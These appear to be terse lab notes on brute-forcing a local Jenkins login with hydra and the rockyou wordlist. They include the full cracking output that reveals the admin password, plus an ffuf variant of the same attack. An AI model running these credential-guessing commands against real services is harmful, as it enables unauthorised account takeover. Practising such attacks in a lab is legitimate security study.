
The default user credentials are admin and password.
https://docs.redhat.com/en/documentation/openshift_container_platform/3.3/html/using_images/other-images#initializing-jenkins


```sh
hydra -V -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 9000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError"
```

got it with burp but test more

finally!
```sh
┌──(kali㉿kali)-[~/tools]
└─$ hydra -V -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 9000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-01 15:30:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://localhost:9000/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError
[ATTEMPT] target localhost - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "654321" - 17 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "michael" - 18 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "ashley" - 19 of 14344399 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "qwerty" - 20 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "111111" - 21 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "iloveu" - 22 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "000000" - 23 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "michelle" - 24 of 14344399 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "tigger" - 25 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "sunshine" - 26 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "chocolate" - 27 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "password1" - 28 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "soccer" - 29 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "anthony" - 30 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "friends" - 31 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "butterfly" - 32 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "purple" - 33 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "angel" - 34 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jordan" - 35 of 14344399 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "liverpool" - 36 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "justin" - 37 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "loveme" - 38 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "fuckyou" - 39 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "123123" - 40 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "football" - 41 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "secret" - 42 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "andrea" - 43 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "carlos" - 44 of 14344399 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jennifer" - 45 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "joshua" - 46 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "bubbles" - 47 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "1234567890" - 48 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "superman" - 49 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "hannah" - 50 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "amanda" - 51 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "loveyou" - 52 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "pretty" - 53 of 14344399 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "basketball" - 54 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "andrew" - 55 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "angels" - 56 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "tweety" - 57 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "flower" - 58 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "playboy" - 59 of 14344399 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "hello" - 60 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "elizabeth" - 61 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "hottie" - 62 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "tinkerbell" - 63 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "charlie" - 64 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "samantha" - 65 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "barbie" - 66 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "chelsea" - 67 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "lovers" - 68 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "teamo" - 69 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jasmine" - 70 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "brandon" - 71 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "666666" - 72 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "shadow" - 73 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "melissa" - 74 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "eminem" - 75 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "matthew" - 76 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "robert" - 77 of 14344399 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "danielle" - 78 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "forever" - 79 of 14344399 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "family" - 80 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jonathan" - 81 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "987654321" - 82 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "computer" - 83 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "whatever" - 84 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "dragon" - 85 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "vanessa" - 86 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "cookie" - 87 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "naruto" - 88 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "summer" - 89 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "sweety" - 90 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "spongebob" - 91 of 14344399 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "joseph" - 92 of 14344399 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "junior" - 93 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "softball" - 94 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "taylor" - 95 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "yellow" - 96 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "daniela" - 97 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "lauren" - 98 of 14344399 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "mickey" - 99 of 14344399 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "princesa" - 100 of 14344399 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "alexandra" - 101 of 14344399 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "alexis" - 102 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jesus" - 103 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "estrella" - 104 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "miguel" - 105 of 14344399 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "william" - 106 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "thomas" - 107 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "beautiful" - 108 of 14344399 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "mylove" - 109 of 14344399 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "angela" - 110 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "poohbear" - 111 of 14344399 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "patrick" - 112 of 14344399 [child 10] (0/0)
[9000][http-post-form] host: localhost   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-01 15:31:09
```

[9000][http-post-form] host: localhost   login: admin   password: spongebob



```sh
ffuf -s -w /usr/share/wordlists/rockyou.txt:PASS -u http://localhost:9000/j_acegi_security_check -d "username=admin&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -fr "loginError"
```
